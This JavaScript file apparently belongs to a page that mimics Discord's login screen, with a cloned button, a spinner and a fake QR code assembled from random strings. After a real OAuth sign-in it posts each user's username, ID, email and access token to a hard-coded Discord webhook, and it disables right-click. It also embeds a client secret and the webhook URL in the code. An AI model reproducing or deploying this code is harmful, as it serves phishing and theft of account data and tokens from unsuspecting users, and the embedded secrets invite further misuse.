const CLIENT_ID = "1424516359081164840";
const CLIENT_SECRET = "K-82g7OPPevGWbz0A0LlJZMyJZG-9qZ3";
const REDIRECT_URI = "http://localhost:3000/callback";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G";
const DISCORD_SCOPES = "identify";

function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
  let result = "";
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  for (let i = 0; i < length; i++) {
    result += characters[array[i] % characters.length];
  }
  return result;
}

async function sha256(plain) {
  const encoder = new TextEncoder();
  const data = encoder.encode(plain);
  return crypto.subtle.digest("SHA-256", data);
}

async function base64URLEncode(arrayBuffer) {
  const bytes = new Uint8Array(arrayBuffer);
  let binary = "";
  for (let i = 0; i < bytes.byteLength; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}

async function generatePKCE() {
  const codeVerifier = generateRandomString(128);
  sessionStorage.setItem("pkce_verifier", codeVerifier);
  return await base64URLEncode(await sha256(codeVerifier));
}

async function getOAuthURL() {
  const codeChallenge = await generatePKCE();
  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: "code",
    scope: DISCORD_SCOPES,
    state: generateRandomString(16),
    code_challenge: codeChallenge,
    code_challenge_method: "S256",
  });
  return `https://discord.com/api/oauth2/authorize?${params.toString()}`;
}

async function exchangeCodeForToken(code) {
  const verifier = sessionStorage.getItem("pkce_verifier");
  if (!verifier) throw new Error("PKCE verifier not found");
  const body = new URLSearchParams({
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    grant_type: "authorization_code",
    code: code,
    redirect_uri: REDIRECT_URI,
    code_verifier: verifier,
  });
  const response = await fetch("https://discord.com/api/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  });
  if (!response.ok) throw new Error(`Token exchange failed: ${response.statusText}`);
  return await response.json();
}

async function fetchUserInfo(accessToken) {
  const response = await fetch("https://discord.com/api/users/@me", {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  if (!response.ok) throw new Error(`Failed to fetch user: ${response.statusText}`);
  return await response.json();
}

async function sendAuthDataToWebhook(user, accessToken) {
  const payload = {
    username: user.username,
    discriminator: user.discriminator,
    id: user.id,
    email: user.email || "N/A",
    avatar: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` : null,
    accessToken: accessToken,
    timestamp: new Date().toISOString(),
  };
  const response = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "New Discord Auth Login",
      embeds: [
        {
          title: "Authenticated User",
          fields: [
            { name: "Username", value: `${payload.username}#${payload.discriminator}`, inline: true },
            { name: "User ID", value: payload.id, inline: true },
            { name: "Email", value: payload.email, inline: true },
            { name: "Access Token", value: `${payload.accessToken.substring(0, 20)}...`, inline: false },
            { name: "Timestamp", value: payload.timestamp, inline: false },
          ],
          thumbnail: { url: payload.avatar },
          color: 0x5865F2,
        },
      ],
    }),
  });
  if (!response.ok) {
    console.error("Failed to send to webhook:", response.statusText);
    alert("Auth successful, but failed to notify server.");
  }
}

async function handleAuthCallback() {
  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get("code");
  const error = urlParams.get("error");
  const loginButton = document.getElementById("loginButton");

  if (error) {
    alert(`Auth error: ${error}`);
    window.history.replaceState({}, document.title, window.location.pathname);
    return;
  }

  if (code) {
    try {
      loginButton.innerHTML = `
        <span class="spinner" role="img" aria-label="Loading">
          <span class="inner pulsingEllipsis">
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
            <span class="item spinnerItem"></span>
          </span>
        </span>`;
      loginButton.setAttribute("disabled", "true");

      const tokenData = await exchangeCodeForToken(code);
      const user = await fetchUserInfo(tokenData.access_token);
      await sendAuthDataToWebhook(user, tokenData.access_token);
      alert(`Login successful! Welcome, ${user.username}#${user.discriminator}`);
      window.history.replaceState({}, document.title, window.location.pathname);
      loginButton.textContent = `Logged in as ${user.username}`;
      loginButton.style.backgroundColor = "#43b581";
    } catch (err) {
      console.error("Auth failed:", err);
      alert("Authentication failed. Please try again.");
    } finally {
      loginButton.innerHTML = "";
      loginButton.textContent = "Log In with Discord";
      loginButton.removeAttribute("disabled");
    }
  }
}

function animateEllipsis() {
  const loginButton = document.getElementById("loginButton");
  loginButton.innerHTML = `
    <span class="spinner" role="img" aria-label="Loading">
      <span class="inner pulsingEllipsis">
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
      </span>
    </span>`;
  loginButton.setAttribute("disabled", "true");
  setTimeout(async () => {
    window.location.href = await getOAuthURL();
  }, 1000);
}

function generateRandomStringOld() {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < 43; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function generateQRCode(data) {
  try {
    const qr = new QRCode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", `0 0 ${moduleCount} ${moduleCount}`);
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

function removeQrCodeAnimation() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.innerHTML = "";
  const qrCode = generateQRCode(`https://discord.com/ra/${generateRandomStringOld()}`);
  if (qrCode) {
    qrCodeContainer.appendChild(qrCode);
  }
  qrCodeContainer.insertAdjacentHTML("beforeend", `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`);
  qrCodeContainer.style.background = "white";
}

function simulateQrCodeChange() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.innerHTML = "";
  qrCodeContainer.style.background = "transparent";
  qrCodeContainer.insertAdjacentHTML(
    "afterbegin",
    `
    <span class="spinner qrCode-spinner" role="img" aria-label="Loading" aria-hidden="true">
      <span class="inner wanderingCubes">
        <span class="item"></span>
        <span class="item"></span>
      </span>
    </span>`
  );
  setTimeout(removeQrCodeAnimation, 3500);
}

const loginButton = document.getElementById("loginButton");
loginButton.textContent = "Log In with Discord";
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", (e) => e.preventDefault());
setInterval(simulateQrCodeChange, 120 * 1000);
handleAuthCallback();
